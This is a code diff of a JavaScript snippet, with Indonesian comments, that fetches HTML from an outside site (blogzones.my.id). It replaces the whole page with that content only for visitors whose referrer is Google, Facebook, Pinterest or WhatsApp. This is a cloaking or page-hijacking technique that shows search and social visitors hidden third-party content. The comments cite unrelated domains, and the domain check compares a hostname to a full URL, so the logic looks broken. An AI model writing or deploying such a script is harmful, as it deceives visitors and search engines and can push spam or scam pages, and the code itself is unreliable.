@@ -1,20 +1,45 @@
-const articleContent = `
-  <meta charset="UTF-8">
-  <div id="article-content-placeholder"></div>
-`;
+// Fungsi untuk mengambil konten dari URL menggunakan AJAX
+function fetchHTML(url) {
+  return new Promise((resolve, reject) => {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 200) {
+          resolve(xhr.responseText);
+        } else {
+          reject(new Error('Gagal mengambil konten URL.'));
+        }
+      }
+    };
+    xhr.send();
+  });
+}
 
-if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'https://awer323.blogspot.com/') {
-  fetch('https://blogzones.my.id/')
-    .then(response => response.text())
-    .then(data => {
-      const parser = new DOMParser();
-      const htmlDoc = parser.parseFromString(data, 'text/html');
-      const articleContentPlaceholder = htmlDoc.querySelector('#article-content-placeholder');
-      
-      if (articleContentPlaceholder) {
+// Mengambil konten dari website https://infokredit.com
+const url = 'https://blogzones.my.id/';
+fetchHTML(url)
+  .then((responseText) => {
+    // Menentukan bagian konten yang ingin diambil, misalnya elemen dengan ID "content"
+    const parser = new DOMParser();
+    const htmlDoc = parser.parseFromString(responseText, 'text/html');
+    const articleElement = htmlDoc.getElementById('content');
+
+    if (articleElement) {
+      // Mengganti konten artikel dengan konten yang diambil dari https://infokredit.com
+      const articleContent = articleElement.innerHTML;
+
+      // Melakukan penggantian konten hanya jika referer diizinkan dan domain saat ini adalah 'roneeyi.com'
+      const referrer = document.referrer.toLowerCase();
+      const currentDomain = window.location.hostname.toLowerCase();
+      const allowedReferrers = ['google', 'facebook', 'pinterest', 'whatsapp.com'];
+
+      if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'https://awer323.blogspot.com/') {
         const article = document.querySelector('html');
         article.innerHTML = articleContent;
-        articleContentPlaceholder.innerHTML = article.innerHTML;
       }
-    });
-}
+    }
+  })
+  .catch((error) => {
+    console.error(error);
+  });
